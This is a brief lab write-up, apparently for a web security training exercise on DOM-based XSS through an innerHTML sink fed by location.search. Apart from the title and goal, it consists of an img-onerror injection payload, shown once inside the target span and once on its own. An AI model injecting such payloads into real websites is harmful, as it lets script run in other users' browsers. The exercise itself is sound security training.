Lab #4 – DOM XSS in innerHTML sink using source location.search

Target Goal - Exploit the DOM-based XSS vulnerability to call the alert function.

Analysis:

<span id="searchMessage"><img src=1 onerror=alert(1)></span>

<img src=1 onerror=alert(1)>
